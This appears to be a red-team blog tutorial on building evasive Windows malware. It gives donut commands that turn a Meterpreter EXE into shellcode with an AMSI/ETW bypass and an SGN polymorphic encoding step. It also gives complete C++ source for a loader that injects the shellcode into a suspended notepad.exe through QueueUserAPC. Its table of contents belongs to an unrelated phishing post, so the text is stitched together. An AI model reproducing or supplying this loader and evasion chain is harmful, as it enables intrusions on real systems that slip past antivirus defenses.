## Table of Contents

- [**Outline**](#section-0)
- [**Domain and Server Setup**](#section-1)
- [**Cloning and Setting Up NoPhish**](#section-2)
- [**DNS and HTTPS Configuration**](#section-3)
- [**Launching the Phishing Attack**](#section-4)
- [**Accessing the Admin Panel**](#section-5)
- [**Conclusion**](#section-6)




## Outline  {#section-0}



video width="640" height="480" controls>
  <source src="/assets/AV/MSI_Final.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

## Creating MSI Malware {#section-0}

## Executable to Shell Code
We will convert meterpreter EXE to shellcode using donut.


https://github.com/TheWover/donut

This Donut command loads piggy.exe into memory with:
1) no entropy obfuscation (-e)
2) uses AMSI/WLDP/ETW bypass with a fail-safe option to continue if bypass fails (-b)
3) compresses the file using the aPLib engine (-z 2), and employs a decoy module at 
level 5 (-j 5) for added obfuscation and evasion.

```bash
./donut -i /home/kali/donut/piggy.exe -e 1 -b 3 -z -j 5
```

## Polymorphic Shellcode Encoding (Shiginakatai)


```bash
sgn -i '/home/kali/donut/loader.bin' -o /home/kali/donut/loaderEncrypted.bin -a 64 -c 8 --verbose
```
The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.
## Creating APC Shellcode Loader
Creating a Shellcode Loader

Now that we have our encoded shellcode, we need to create a PE, exe file to launch this shellcode using c++.
VirtualAlloc: Allocates memory for the payload, typically using MEM_COMMIT and PAGE_READWRITE to allow writing to the allocated memory.
RtlMoveMemory: Copies the payload (malicious code) from the file or buffer into the newly allocated memory region.
VirtualProtect: Changes the protection of the allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ to allow the payload to execute.
CreateThread: Starts a new thread, executing the payload in memory. This is the method used to run the injected code.
WaitForSingleObject: Pauses the current thread until the thread running the payload finishes execution, ensuring the payload completes.
QueueUserAPC: This function queues an Asynchronous Procedure Call (APC) to a specific thread. If used with a thread in an alertable state (such as one created with SleepEx or WaitForSingleObjectEx), the payload will be executed when the thread enters that state. This technique is commonly used to inject code into a thread in a less obvious manner, bypassing some common defenses.

```bash
#include <windows.h>
#include <windows.h>
#include <stdio.h>

// Function to read a binary file
unsigned char* readBinaryFile(const char* fileName, SIZE_T* size) {
    FILE* file = fopen(fileName, "rb");
    if (!file) {
        printf("Could not open file %s\n", fileName);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*size);
    if (!buffer) {
        printf("Memory allocation failed\n");
        fclose(file);
        return NULL;
    }

    fread(buffer, 1, *size, file);
    fclose(file);
    return buffer;
}

int main() {
    // Read shellcode from the binary file (e.g., loaderEncrypted.bin)
    const char* fileName = "loaderEncrypted.bin";
    SIZE_T shellcodeSize;
    unsigned char* shellcode = readBinaryFile(fileName, &shellcodeSize);
    
    if (!shellcode) {
        printf("Failed to read the binary file.\n");
        return -1;
    }

    // Create a suspended Notepad process
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to create process\n");
        free(shellcode);
        return -1;
    }

    // Allocate memory in the target process
    LPVOID bufferAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!bufferAddr) {
        printf("VirtualAllocEx failed\n");
        free(shellcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(pi.hProcess, bufferAddr, shellcode, shellcodeSize, NULL)) {
        printf("WriteProcessMemory failed\n");
        free(shellcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Queue the APC for the shellcode to be executed
    QueueUserAPC((PAPCFUNC)bufferAddr, pi.hThread, NULL);

    // Resume the suspended thread to execute the shellcode
    ResumeThread(pi.hThread);

    // Cleanup
    free(shellcode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

```


 